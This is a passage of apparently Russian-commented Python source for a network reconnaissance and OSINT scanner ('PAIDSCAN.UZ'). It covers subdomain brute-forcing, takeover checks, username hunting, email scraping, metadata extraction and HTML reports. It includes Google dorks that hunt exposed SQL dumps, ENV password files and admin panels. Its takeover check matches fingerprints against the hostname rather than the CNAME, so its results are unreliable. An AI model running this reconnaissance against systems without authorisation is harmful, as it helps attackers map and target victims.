def subdomain_takeover(domain):
    """Check subdomains for potential takeover (NXDOMAIN + known fingerprints)"""
    cname_fingerprints={
        "github.io":        "GitHub Pages",
        "herokuapp.com":    "Heroku",
        "s3.amazonaws.com": "AWS S3",
        "azurewebsites.net":"Azure",
        "netlify.app":      "Netlify",
        "surge.sh":         "Surge.sh",
        "readme.io":        "ReadMe",
        "zendesk.com":      "Zendesk",
        "freshdesk.com":    "Freshdesk",
        "shopify.com":      "Shopify",
    }
    wordlist=["www","mail","blog","dev","api","test","staging","app","cdn","static"]
    vulnerable=[]; total=len(wordlist); done=[0]; lock=threading.Lock()
    def check(sub):
        fqdn=f"{sub}.{domain}"
        try:
            ip=socket.gethostbyname(fqdn)
            for fp,service in cname_fingerprints.items():
                if fp in fqdn:
                    with lock: vulnerable.append({"sub":fqdn,"service":service,"ip":ip,"risk":"POTENTIAL"})
        except socket.gaierror:
            with lock: vulnerable.append({"sub":fqdn,"service":"NXDOMAIN","ip":"none","risk":"CHECK"})
        with lock: done[0]+=1; progress_bar(done[0],total)
    with ThreadPoolExecutor(max_workers=30) as ex: list(ex.map(check,wordlist))
    print(" "*80,end="\r")
    return [v for v in vulnerable if v["risk"] in ("POTENTIAL",)]

# ══════════════════════════════════════════════════════════════
#  СЕТЬ
# ══════════════════════════════════════════════════════════════
def ping_host(host,count=4):
    param="-n" if platform.system().lower()=="windows" else "-c"
    try:
        r=subprocess.run(["ping",param,str(count),"-W","2",host],
                         capture_output=True,text=True,timeout=15)
        alive=r.returncode==0; times=[]
        for line in r.stdout.split("\n"):
            if "time=" in line:
                try: times.append(float(line.split("time=")[1].split()[0].replace("ms","")))
                except: pass
        avg=sum(times)/len(times) if times else None
        return {"alive":alive,"avg":avg,"min":min(times) if times else None,
                "max":max(times) if times else None,"times":times}
    except: return {"alive":False,"avg":None,"min":None,"max":None,"times":[]}

def traceroute(host):
    cmd=["tracert","-d","-h","20",host] if platform.system().lower()=="windows" \
        else ["traceroute","-n","-m","20",host]
    try:
        r=subprocess.run(cmd,capture_output=True,text=True,timeout=60)
        return r.stdout
    except Exception as e: return str(e)

def guess_os(host):
    param="-n" if platform.system().lower()=="windows" else "-c"
    try:
        r=subprocess.run(["ping",param,"1","-W","2",host],
                         capture_output=True,text=True,timeout=5)
        for line in r.stdout.split("\n"):
            if "ttl=" in line.lower():
                ttl=int(line.lower().split("ttl=")[1].split()[0].strip())
                if ttl<=64:    return f"Linux / Unix   (TTL={ttl})"
                elif ttl<=128: return f"Windows        (TTL={ttl})"
                else:          return f"Cisco / Router (TTL={ttl})"
    except: pass
    return "Unknown"

def dns_lookup(target):
    info={"target":target}
    try:
        ip=socket.gethostbyname(target); info["ip"]=ip
        try: info["reverse"]=socket.gethostbyaddr(ip)[0]
        except: info["reverse"]=None
        try: info["all_ips"]=list(set([x[4][0] for x in socket.getaddrinfo(target,None)]))
        except: info["all_ips"]=[ip]
    except socket.gaierror as e: info["error"]=str(e)
    return info

def whois_lookup(target):
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.settimeout(8); s.connect(("whois.iana.org",43))
            s.send((target.strip()+"\r\n").encode())
            resp=b""
            while True:
                data=s.recv(4096)
                if not data: break
                resp+=data
            text=resp.decode(errors="ignore"); refer=None
            for line in text.split("\n"):
                if line.lower().startswith("refer:"):
                    refer=line.split(":",1)[1].strip(); break
            if refer:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s2:
                    s2.settimeout(8); s2.connect((refer,43))
                    s2.send((target.strip()+"\r\n").encode())
                    resp2=b""
                    while True:
                        data=s2.recv(4096)
                        if not data: break
                        resp2+=data
                    return resp2.decode(errors="ignore")
            return text
    except Exception as e: return f"Error: {e}"

def get_arp_table():
    try:
        if platform.system().lower()=="windows":
            r=subprocess.run(["arp","-a"],capture_output=True,text=True)
        else:
            r=subprocess.run(["arp","-n"],capture_output=True,text=True)
        entries=[]
        for line in r.stdout.split("\n"):
            parts=line.split()
            if len(parts)>=3:
                ip=parts[0]
                if ip.count(".")==3:
                    mac=parts[2] if platform.system().lower()!="windows" else parts[1]
                    entries.append({"ip":ip,"mac":mac,"vendor":mac_vendor(mac)})
        return entries
    except Exception as e: return [{"error":str(e)}]

def get_asn_info(ip):
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.settimeout(6); s.connect(("whois.radb.net",43))
            s.send(f"-T route {ip}\r\n".encode())
            resp=b""
            while True:
                data=s.recv(2048)
                if not data: break
                resp+=data
            text=resp.decode(errors="ignore"); info={}
            for line in text.split("\n"):
                for key in ["origin","descr","route","mnt-by"]:
                    if line.lower().startswith(key+":"):
                        info[key]=line.split(":",1)[1].strip()
            return info
    except Exception as e: return {"error":str(e)}

def check_ssl(host,port=443):
    try:
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(),server_hostname=host) as s:
            s.settimeout(5); s.connect((host,port))
            return {"ok":True,"cert":s.getpeercert(),"cipher":s.cipher(),"version":s.version()}
    except Exception as e: return {"ok":False,"error":str(e)}

def get_http_headers(host,port=80,use_https=False):
    scheme="https" if use_https else "http"
    try:
        req=urllib.request.Request(f"{scheme}://{host}:{port}/",
                                   headers={"User-Agent":f"PaidScan/{VERSION}"})
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        with urllib.request.urlopen(req,timeout=6,context=ctx) as r:
            return {"ok":True,"status":r.status,"headers":dict(r.headers)}
    except urllib.error.HTTPError as e:
        return {"ok":True,"status":e.code,"headers":dict(e.headers)}
    except Exception as e: return {"ok":False,"error":str(e)}

def detect_technologies(host,port=80,use_https=False):
    resp=get_http_headers(host,port,use_https); techs=[]
    if not resp["ok"]: return techs
    headers={k.lower():v for k,v in resp.get("headers",{}).items()}
    server=headers.get("server",""); powered=headers.get("x-powered-by","")
    for sig,tech in [("nginx","Nginx"),("apache","Apache"),("iis","IIS"),
                      ("cloudflare","Cloudflare"),("litespeed","LiteSpeed")]:
        if sig in server.lower(): techs.append(("Server",tech))
    for sig,tech in [("php","PHP"),("asp.net","ASP.NET"),("express","Node.js"),
                      ("next.js","Next.js"),("ruby","Ruby")]:
        if sig in powered.lower(): techs.append(("Framework",tech))
    scheme="https" if use_https else "http"
    try:
        req=urllib.request.Request(f"{scheme}://{host}:{port}/",headers={"User-Agent":"Mozilla/5.0"})
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        with urllib.request.urlopen(req,timeout=6,context=ctx) as r:
            body=r.read(8000).decode(errors="ignore").lower()
        for sig,tech in [("wp-content","WordPress"),("joomla","Joomla"),("drupal","Drupal"),
                          ("react","React.js"),("vue.js","Vue.js"),("angular","Angular"),
                          ("bootstrap","Bootstrap"),("jquery","jQuery"),("laravel","Laravel"),
                          ("django","Django"),("flask","Flask"),("gatsby","Gatsby")]:
            if sig in body: techs.append(("JS/CMS",tech))
    except: pass
    return techs

def find_subdomains(domain):
    wordlist=["www","mail","ftp","api","admin","dev","staging","test","blog","shop",
              "vpn","ns1","ns2","smtp","cdn","static","m","mobile","app","portal",
              "login","secure","webmail","docs","support","status","beta","git",
              "gitlab","jenkins","ci","monitor","dashboard","panel","cpanel","assets"]
    found=[]; total=len(wordlist); done=[0]; lock=threading.Lock()
    def check(sub):
        fqdn=f"{sub}.{domain}"
        try:
            ip=socket.gethostbyname(fqdn)
            with lock: found.append({"sub":fqdn,"ip":ip})
        except: pass
        with lock: done[0]+=1; progress_bar(done[0],total)
    with ThreadPoolExecutor(max_workers=50) as ex: list(ex.map(check,wordlist))
    print(" "*80,end="\r"); return found

def get_my_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org",timeout=5) as r:
            return r.read().decode().strip()
    except:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.connect(("8.8.8.8",80)); return s.getsockname()[0]
        except: return None

def geolocate_ip(ip=""):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}",timeout=8) as r:
            data=json.loads(r.read().decode())
            if data.get("status")=="success": return data
    except: pass
    return None

def check_blacklists(ip):
    dnsbl=["zen.spamhaus.org","bl.spamcop.net","b.barracudacentral.org",
           "dnsbl.sorbs.net","all.s5h.net","combined.abuse.ch",
           "dnsbl-1.uceprotect.net","ix.dnsbl.manitu.net"]
    rev=".".join(reversed(ip.split(".")))
    def chk(bl):
        try: socket.gethostbyname(f"{rev}.{bl}"); return bl
        except: return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        return [r for r in ex.map(chk,dnsbl) if r]

def check_pwned_password(pwd):
    sha1=hashlib.sha1(pwd.encode()).hexdigest().upper()
    prefix,suffix=sha1[:5],sha1[5:]
    try:
        req=urllib.request.Request(f"https://api.pwnedpasswords.com/range/{prefix}",
                                   headers={"User-Agent":"PaidScan-v6"})
        with urllib.request.urlopen(req,timeout=6) as r:
            for line in r.read().decode().split("\n"):
                parts=line.strip().split(":")
                if len(parts)==2 and parts[0]==suffix: return int(parts[1])
        return 0
    except: return -1

def hunt_username(username):
    found=[]; total=len(SOCIAL_SITES); done=[0]; lock=threading.Lock()
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    def check(site_info):
        name,url_tmpl=site_info; url=url_tmpl.format(username)
        try:
            req=urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req,timeout=5,context=ctx) as r:
                if r.status==200:
                    with lock: found.append({"site":name,"url":url})
        except urllib.error.HTTPError as e:
            if e.code not in [404,410,999,429]:
                with lock: found.append({"site":name,"url":url})
        except: pass
        with lock: done[0]+=1; progress_bar(done[0],total)
    with ThreadPoolExecutor(max_workers=20) as ex: list(ex.map(check,SOCIAL_SITES))
    print(" "*80,end="\r"); return found

def generate_dorks(target):
    return [
        (f'site:{target}',                       "All pages"),
        (f'site:{target} filetype:pdf',           "PDF files"),
        (f'site:{target} filetype:sql',           "SQL dumps"),
        (f'site:{target} filetype:env',           "ENV files (passwords!)"),
        (f'site:{target} intitle:login',          "Login pages"),
        (f'site:{target} inurl:admin',            "Admin panels"),
        (f'site:{target} inurl:backup',           "Backup files"),
        (f'site:{target} "index of"',             "Open directories"),
        (f'site:{target} "password" filetype:txt',"Passwords in TXT"),
        (f'site:{target} ext:log',                "Log files"),
        (f'site:{target} inurl:config',           "Config files"),
        (f'site:{target} inurl:phpinfo',          "phpinfo exposure"),
        (f'cache:{target}',                       "Google cache"),
        (f'"{target}" email OR contact',          "Contact info"),
    ]

def wayback_lookup(domain):
    try:
        url=f"http://archive.org/wayback/available?url={domain}"
        with urllib.request.urlopen(url,timeout=8) as r:
            data=json.loads(r.read().decode())
            snap=data.get("archived_snapshots",{}).get("closest",{})
            return snap
    except: return {}

def get_system_info():
    info={}
    info["os"]=f"{platform.system()} {platform.release()} {platform.machine()}"
    info["hostname"]=socket.gethostname()
    info["python"]=sys.version.split()[0]
    try:
        info["local_ip"]=socket.gethostbyname(socket.gethostname())
    except: info["local_ip"]="unknown"
    try:
        if platform.system().lower()=="windows":
            r=subprocess.run(["ipconfig"],capture_output=True,text=True)
        else:
            r=subprocess.run(["ip","addr"],capture_output=True,text=True)
        info["interfaces"]=r.stdout[:1500]
    except: info["interfaces"]=""
    try:
        r=subprocess.run(["netstat","-n","-t" if platform.system().lower()!="windows" else "-n"],
                         capture_output=True,text=True,timeout=5)
        info["connections"]=r.stdout[:2000]
    except: info["connections"]=""
    return info

def extract_metadata(filepath):
    ext=os.path.splitext(filepath)[1].lower(); meta={}
    try:
        if ext==".pdf":
            with open(filepath,"rb") as f: content=f.read(65536).decode(errors="ignore")
            for tag in ["/Author","/Creator","/Producer","/CreationDate","/Title","/Subject"]:
                idx=content.find(tag)
                if idx!=-1:
                    val=content[idx+len(tag):idx+len(tag)+100].strip().strip("()")[:60]
                    meta[tag.strip("/")]=val
        elif ext in (".docx",".xlsx",".pptx"):
            import zipfile
            with zipfile.ZipFile(filepath) as z:
                if "docProps/core.xml" in z.namelist():
                    xml=z.read("docProps/core.xml").decode(errors="ignore")
                    for tag in ["dc:creator","dc:title","cp:lastModifiedBy","dcterms:created"]:
                        m=re.search(f"<{tag}>(.*?)</{tag}>",xml)
                        if m: meta[tag]=m.group(1)
        elif ext in (".jpg",".jpeg"):
            with open(filepath,"rb") as f: data=f.read(65536)
            for field in [b"Make",b"Model",b"Software",b"DateTime",b"Artist"]:
                idx=data.find(field)
                if idx!=-1:
                    val=data[idx+len(field):idx+len(field)+50]
                    meta[field.decode()]=val.decode(errors="ignore").strip("\x00")[:50]
    except Exception as e: meta["error"]=str(e)
    return meta

def bandwidth_test():
    results=[]
    for name,url in [("Cloudflare","https://speed.cloudflare.com/__down?bytes=5000000"),]:
        try:
            start=time.time()
            req=urllib.request.Request(url,headers={"User-Agent":"PaidScan/6.0"})
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            with urllib.request.urlopen(req,timeout=15,context=ctx) as r:
                data=r.read(5*1024*1024)
            elapsed=time.time()-start; size_mb=len(data)/1024/1024
            results.append({"server":name,"size_mb":size_mb,"time":elapsed,"mbps":(size_mb*8)/elapsed})
        except Exception as e: results.append({"server":name,"error":str(e)})
    return results

def get_robots_sitemap(host,port=80,use_https=False):
    scheme="https" if use_https else "http"; results={}
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    for path in ["/robots.txt","/sitemap.xml"]:
        try:
            req=urllib.request.Request(f"{scheme}://{host}:{port}{path}",
                                       headers={"User-Agent":f"PaidScan/{VERSION}"})
            with urllib.request.urlopen(req,timeout=5,context=ctx) as r:
                if r.status==200: results[path]=r.read(4000).decode(errors="ignore")
        except: pass
    return results

def find_emails_in_page(host,port=80,use_https=False):
    scheme="https" if use_https else "http"
    try:
        req=urllib.request.Request(f"{scheme}://{host}:{port}/",
                                   headers={"User-Agent":f"PaidScan/{VERSION}"})
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        with urllib.request.urlopen(req,timeout=8,context=ctx) as r:
            body=r.read(32000).decode(errors="ignore")
        emails=list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",body)))
        return [e for e in emails if not e.endswith((".png",".jpg",".gif",".css",".js"))]
    except: return []

def monitor_host(host,interval=5,count=10):
    results=[]
    print(p("info",f"\n  Monitor {host} ({count}x / {interval}s)\n"))
    print(p("bold",f"  {'#':<5}{'STATUS':<14}{'LATENCY':<14}TIME"))
    print(sep())
    for i in range(1,count+1):
        ping=ping_host(host,count=1); ts=datetime.now().strftime("%H:%M:%S")
        status=p("success",f"● {L('online'):<10}") if ping["alive"] else p("warn",f"○ {L('offline'):<10}")
        ms=f"{ping['avg']:.1f}ms" if ping["avg"] else "—"
        ms_col=p("success",ms) if ping["avg"] and ping["avg"]<100 else p("warn",ms)
        print(f"  {p('dim',str(i)):<6}{status}  {ms_col:<22}{p('dim',ts)}")
        results.append({"n":i,"alive":ping["alive"],"ms":ping["avg"],"time":ts})
        if ping["alive"]: beep()
        if i<count: time.sleep(interval)
    online=sum(1 for r in results if r["alive"])
    avg_ms=[r["ms"] for r in results if r["ms"]]
    avg=sum(avg_ms)/len(avg_ms) if avg_ms else 0
    print(sep())
    print(p("bold",f"\n  Online: {p('success',str(online))}/{count}  |  Avg: {p('warn',f'{avg:.1f}ms')}"))
    return results

def ascii_ping_chart(times):
    if not times: return
    mx=max(times); mn=min(times); rng=mx-mn or 1; H=8
    print(p("bold","\n  Ping chart:"))
    for row in range(H,0,-1):
        threshold=mn+(rng*(row/H))
        line="  │"
        for t in times: line+=p("success","█") if t>=threshold else " "
        label=f" {threshold:.0f}ms" if row in (1,H) else ""
        print(line+p("dim",label))
    print(p("dim","  └"+"─"*len(times)))

def compare_scans(s1,s2):
    p1=set(r["port"] for r in s1); p2=set(r["port"] for r in s2)
    return {"new_open":p2-p1,"now_closed":p1-p2,"unchanged":p1&p2}

def analyze_risks(results):
    risks=[]
    for r in results:
        svc=r.get("service","")
        if svc in RISK_DB:
            level,desc=RISK_DB[svc]
            risks.append({"port":r["port"],"service":svc,"level":level,"desc":desc})
    return risks

def add_to_history(action,target,summary):
    SCAN_HISTORY.append({"time":datetime.now().strftime("%H:%M:%S"),
                          "action":action,"target":target,"summary":summary})

# ══════════════════════════════════════════════════════════════
#  ОТЧЁТЫ
# ══════════════════════════════════════════════════════════════
def save_txt(host,results,notes=None):
    ts=datetime.now().strftime("%Y%m%d_%H%M%S"); fname=f"paidscan_{host.replace('.','_')}_{ts}.txt"
    risks=analyze_risks(results)
    with open(fname,"w",encoding="utf-8") as f:
        f.write(f"{'='*62}\n  {SITE} v{VERSION}  |  dev: {AUTHOR}\n{'='*62}\n")
        f.write(f"Target: {host}\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        if notes:
            for n in notes: f.write(n+"\n")
            f.write("\n")
        f.write(f"OPEN PORTS ({len(results)})\n{'─'*50}\n")
        for r in results: f.write(f"  {r['port']:<7}{r['service']:<16}{r.get('banner','')[:50]}\n")
        if risks:
            f.write(f"\nRISKS ({len(risks)})\n{'─'*50}\n")
            for risk in risks: f.write(f"  [{risk['level']}] {risk['port']} {risk['service']}\n  → {risk['desc']}\n\n")
        f.write(f"\n© {SITE} | dev: {AUTHOR}\n")
    return fname

def save_json(host,results,extra=None):
    ts=datetime.now().strftime("%Y%m%d_%H%M%S"); fname=f"paidscan_{host.replace('.','_')}_{ts}.json"
    with open(fname,"w",encoding="utf-8") as f:
        json.dump({"meta":{"tool":SITE,"version":VERSION,"author":AUTHOR,
                            "date":datetime.now().isoformat(),"target":host},
                   "ports":results,"risks":analyze_risks(results),"extra":extra or {}},
                  f,indent=2,ensure_ascii=False)
    return fname

def save_html(host,results,extra=None):
    ts=datetime.now().strftime("%Y%m%d_%H%M%S"); fname=f"paidscan_{host.replace('.','_')}_{ts}.html"
    risks=analyze_risks(results)
    risks=analyze_risks(results)
    rc_map={"CRITICAL":"#ff3333","HIGH":"#ff7700","MEDIUM":"#ffcc00","LOW":"#66aa66"}
    def get_risk_label(r):
        risk = next((x for x in risks if x["port"] == r["port"]), None)
        if not risk:
            return ""
        color = rc_map.get(risk["level"], "#444")
        return f"<span style='background:{color};color:#000;padding:1px 7px;border-radius:3px;font-size:11px;font-weight:bold'>{risk['level']}</span>"
    port_rows="".join(
        f"<tr><td style='color:#ff4444'>{r['port']}</td><td class='open'>OPEN</td>"
        f"<td style='color:#ffd700'>{r['service']}</td>"
        f"<td>{get_risk_label(r)}</td>"
        f"<td style='color:#666;font-size:12px'>{r.get('banner','')[:55]}</td></tr>"
        for r in results)
    risk_rows="".join(
        f"<tr><td><span style='background:{rc_map.get(risk['level'],'#aaa')};color:#000;padding:2px 8px;border-radius:3px;font-weight:bold'>{risk['level']}</span></td>"
        f"<td style='color:#ff4444'>{risk['port']}</td><td style='color:#ffd700'>{risk['service']}</td>"
        f"<td style='color:#999'>{risk['desc']}</td></tr>"
        for risk in risks)
    extra_html="".join(f"<div style='color:#666'>{l}</div>" for l in (extra or []))
    html=f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{SITE} — {host}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{background:#050505;color:#ddd;font-family:'Courier New',monospace;padding:30px}}
h1{{color:#ff2222;font-size:30px;letter-spacing:6px;text-shadow:0 0 20px #ff000066}}
.sub{{color:#441111;font-size:12px;margin:4px 0 30px;letter-spacing:2px}}
.card{{background:#0d0d0d;border:1px solid #1a1a1a;border-left:3px solid #ff2222;border-radius:4px;padding:20px;margin-bottom:18px}}
.ct{{color:#ff4444;font-size:13px;letter-spacing:3px;margin-bottom:14px;text-transform:uppercase}}
table{{width:100%;border-collapse:collapse}}th{{color:#331111;font-size:11px;text-align:left;padding:6px 10px;border-bottom:1px solid #1a1a1a;text-transform:uppercase}}
td{{padding:7px 10px;border-bottom:1px solid #111;font-size:13px}}tr:hover td{{background:#0f0808}}
.open{{color:#ff4444;font-weight:bold}}.stat{{display:inline-block;background:#0d0d0d;border:1px solid #1a1a1a;border-top:2px solid #ff2222;border-radius:4px;padding:12px 22px;margin:5px;text-align:center}}
.sn{{font-size:30px;color:#ff2222}}.sl{{font-size:10px;color:#441111;margin-top:3px;letter-spacing:2px}}
.footer{{color:#1a1a1a;font-size:11px;text-align:center;margin-top:30px;border-top:1px solid #111;padding-top:15px}}</style></head><body>
<h1>PAIDSCAN.UZ</h1><div class="sub">ULTIMATE RECON  ///  DEV: {AUTHOR}  ///  v{VERSION}  ///  {CODENAME}</div>
<div class="card"><div class="ct">Target</div><div style="color:#555;font-size:13px;line-height:2">
<span style='color:#ff4444'>Target:</span> <span style='color:#ff8888'>{host}</span><br>
<span style='color:#ff4444'>Date:</span> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br>{extra_html}</div></div>
<div style='margin:15px 0'>
<div class="stat"><div class="sn">{len(results)}</div><div class="sl">OPEN PORTS</div></div>
<div class="stat"><div class="sn">{len(risks)}</div><div class="sl">RISKS</div></div>
<div class="stat"><div class="sn" style="color:{'#ff2222' if any(r['level']=='CRITICAL' for r in risks) else '#ff8800'}">{sum(1 for r in risks if r['level']=='CRITICAL')}</div><div class="sl">CRITICAL</div></div></div>
<div class="card"><div class="ct">Open Ports</div>
{'<p style="color:#331111">No open ports.</p>' if not results else f'<table><tr><th>Port</th><th>State</th><th>Service</th><th>Risk</th><th>Banner</th></tr>{port_rows}</table>'}
</div>{'<div class="card"><div class="ct">Security Risks</div><table><tr><th>Level</th><th>Port</th><th>Service</th><th>Description</th></tr>'+risk_rows+'</table></div>' if risks else ''}
<div class="footer">© {SITE} | dev: {AUTHOR} | Authorized testing only</div></body></html>"""
    with open(fname,"w",encoding="utf-8") as f: f.write(html)
    return fname

def save_report_menu(host,results,extra=None):
    print(f"\n  {p('success','1')} TXT   {p('success','2')} JSON   {p('success','3')} HTML   {p('dim','Enter')} skip")
    sv=input(p("info",f"  {L('save_prompt')}")).strip()
    if   sv=="1": print(p("success",f"  ✓ → {save_txt(host,results,extra)}"))
    elif sv=="2": print(p("success",f"  ✓ → {save_json(host,results)}"))
    elif sv=="3": print(p("success",f"  ✓ → {save_html(host,results,extra)}"))
    if CFG.get("auto_report") and sv not in ("1","2","3"):
        print(p("dim",f"  [auto] → {save_txt(host,results,extra)}"))

# ══════════════════════════════════════════════════════════════
#  МЕНЮ
# ══════════════════════════════════════════════════════════════
def main_menu():
    t=T(); br=t["br"]; bo=t["bo"]; rs=t["rs"]; pr=t["pr"]; di=t["di"]; wa=t["wa"]
    W=54
    def row(n,i,note=""):
        txt=LI(i)
        nt=f" {di}{note}{rs}" if note else ""
        return f"  {br}║{rs}  {pr}{bo}{str(n):<3}{rs} {wa}{txt:<33}{rs}{nt}{br}║{rs}"
    def sect(i):
        sects=LANGS[LANG].get("sections",[]); s=sects[i] if i<len(sects) else ""
        return f"  {br}║{rs}  {di}{'— '+s+' —':^52}{rs}  {br}║{rs}"
    print(f"  {br}╔{'═'*W}╗{rs}")
    print(f"  {br}║{rs}  {pr}{bo}{'[ PAIDSCAN.UZ — '+L('menu_title')+' ]':^52}{rs}  {br}║{rs}")
    print(f"  {br}╠{'═'*W}╣{rs}")
    print(sect(0))
    for n,i in [(1,0),(2,1),(3,2)]: print(row(n,i))
    print(sect(1))
    for n,i in [(4,3),(5,4),(6,5),(7,6),(8,7),(9,8)]: print(row(n,i))
    print(sect(2))
    for n,i in [(10,9),(11,10),(12,11),(13,12),(14,13),(15,14),(16,15),(17,16),(18,17),(19,18),(20,19)]: print(row(n,i))
    print(sect(3))
    for n,i in [(21,20),(22,21),(23,22)]: print(row(n,i))
    print(sect(4))
    for n,i in [(24,23),(25,24),(26,25),(27,26),(28,27),(29,28),(30,29),(31,30),(32,31),(33,32),(34,33),(35,34)]: print(row(n,i))
    print(sect(5))
    for n,i in [(36,35),(37,36),(38,37),(39,38)]: print(row(n,i))
    print(f"  {br}║{rs}  {wa}0   {di}{L('goodbye')[:40]:<41}{rs}  {br}║{rs}")
    print(f"  {br}╚{'═'*W}╝{rs}")
    return input(p("info",f"\n  {L('choice_prompt')}")).strip()

def resolve_alias(t): return CFG.get("aliases",{}).get(t.lower(),t)
def ask_target(): return resolve_alias(input(p("info",f"  {L('target_prompt')}")).strip())
def ask_ip():
    try: return socket.gethostbyname(ask_target())
    except Exception as e: print(p("warn",f"  {L('resolv_err')}: {e}")); return None
def get_port_https():
    port_in=input(p("info",f"  {L('port_prompt')}")).strip()
    port=int(port_in) if port_in.isdigit() else 80
    return port, port==443

# ══════════════════════════════════════════════════════════════
#  ЭКРАНЫ
# ══════════════════════════════════════════════════════════════
def print_ports(host,results):
    risks=analyze_risks(results)
    print(p("bold",f"\n  ┌─ {L('open')} ports: {host}"))
    if not results: print(p("dim",f"  │  {L('not_found')}"))
    else:
        print(p("bold",f"  │  {'PORT':<9}{'SERVICE':<16}BANNER"))
        print(sep())
        for r in results:
            svc=r['service'].ljust(16)
            print(f"  │  {p('primary',str(r['port'])):<21}{p('warn',svc)}{p('dim',r.get('banner','')[:35])}")
    print(p("bold","  └"+"─"*52))
    if risks:
        print(p("bold",f"\n  ┌─ {L('risks')}"))
        for risk in risks:
            rc="warn" if risk["level"]=="MEDIUM" else("dim" if risk["level"]=="LOW" else "primary")
            print(f"  │  {p(rc,'['+risk['level']+']'):<24}{risk['port']} {p('warn',risk['service'])}")
            print(p("dim",f"  │    ↳ {risk['desc']}"))
        print(p("bold","  └"+"─"*52))

def port_scan_screen():
    clear(); print_banner(); header(LI(0))
    target=ask_target()
    if not target: return
    print(p("bold",f"\n  {L('scan_mode')}"))
    print(f"  {p('success','1')}  {L('ports_std')} ({len(COMMON_PORTS)})")
    print(f"  {p('success','2')}  {L('ports_1024')}")
    print(f"  {p('success','3')}  {L('ports_all')}")
    print(f"  {p('success','4')}  {L('ports_custom')}")
    mode=input(p("info",f"\n  {L('mode_prompt')}")).strip()
    if   mode=="1": ports=sorted(COMMON_PORTS.keys())
    elif mode=="2": ports=list(range(1,1025))
    elif mode=="3": ports=list(range(1,65536))
    elif mode=="4":
        raw=input(p("info",f"  {L('ports_input')}")).strip(); ports=[]
        for part in raw.split(","):
            part=part.strip()
            if "-" in part:
                a,b=part.split("-"); ports.extend(range(int(a),int(b)+1))
            else:
                try: ports.append(int(part))
                except: pass
    else: print(p("warn",L('invalid'))); pause(); return
    try: host_ip=socket.gethostbyname(target)
    except: print(p("warn",L('resolv_err'))); pause(); return
    start=time.time(); results=scan_ports(host_ip,ports); elapsed=time.time()-start
    LAST_SCAN["host"]=host_ip; LAST_SCAN["results"]=results; LAST_SCAN["time"]=datetime.now()
    print_ports(host_ip,results)
    print(p("dim",f"\n  {len(results)} ports  |  {elapsed:.2f}s"))
    add_to_history(LI(0),target,f"{len(results)} open")
    save_report_menu(host_ip,results,[f"Host: {target}"]); pause()

def discover_screen():
    clear(); print_banner(); header(LI(1))
    network=input(p("info",f"  {L('subnet_prompt')}")).strip()
    if not network: return
    start=time.time(); live=discover_hosts(network); elapsed=time.time()-start
    print(p("bold",f"\n  ┌─ {L('hosts_found')}: {network}"))
    if not live: print(p("dim",f"  │  {L('not_found')}"))
    else:
        for h in live:
            print(f"  │  {p('success',h['ip']):<32}{p('dim',h.get('hostname',''))}")
    print(p("bold","  └"+"─"*50))
    print(p("info",f"\n  {L('found')}: {len(live)}  |  {elapsed:.2f}s"))
    add_to_history(LI(1),network,f"{len(live)}"); pause()

def compare_screen():
    clear(); print_banner(); header(LI(2))
    if not LAST_SCAN["host"]: print(p("warn","  Run scan #1 first.")); pause(); return
    host=LAST_SCAN["host"]
    print(p("info",f"  Previous: {host}"))
    new_results=scan_ports(host,sorted(COMMON_PORTS.keys()))
    diff=compare_scans(LAST_SCAN["results"],new_results)
    print(p("bold","\n  ┌─ Changes"))
    for port in sorted(diff["new_open"]):
        print(f"  │  {p('primary','[+] OPENED')} {port} ({COMMON_PORTS.get(port,'?')})")
    for port in sorted(diff["now_closed"]):
        print(f"  │  {p('dim','[-] CLOSED')} {port} ({COMMON_PORTS.get(port,'?')})")
    if not diff["new_open"] and not diff["now_closed"]: print(p("dim","  │  No changes."))
    print(p("bold","  └"+"─"*50))
    LAST_SCAN["results"]=new_results
    add_to_history(LI(2),host,f"+{len(diff['new_open'])}/-{len(diff['now_closed'])}"); pause()

def ping_screen():
    clear(); print_banner(); header(LI(3))
    target=ask_target()
    if not target: return
    try: host_ip=socket.gethostbyname(target)
    except: print(p("warn",L('resolv_err'))); pause(); return
    ping=ping_host(host_ip,count=8)
    if ping["alive"]:
        print(p("success",f"\n  ● {L('online')}"))
        if ping["avg"]:
            avg_s=f"{ping['avg']:.1f}ms"; mn_s=f"{ping['min']:.1f}ms"; mx_s=f"{ping['max']:.1f}ms"
            print(f"  Avg: {p('warn',avg_s)}  Min: {p('success',mn_s)}  Max: {p('primary',mx_s)}")
        if ping["times"]: ascii_ping_chart(ping["times"])
    else: print(p("warn",f"\n  ○ {L('offline')}"))
    print(p("info","\n  OS detection..."))
    print(p("warn",f"  ● {guess_os(host_ip)}"))
    add_to_history(LI(3),target,L('done')); pause()

def traceroute_screen():
    clear(); print_banner(); header(LI(4))
    target=ask_target()
    if not target: return
    print(p("info",f"\n  Traceroute to {target}...\n"))
    output=traceroute(target)
    for line in output.strip().split("\n"):
        if line.strip():
            print(p("success" if any(c.isdigit() for c in line[:5]) else "dim","  "+line))
    add_to_history(LI(4),target,L('done')); pause()

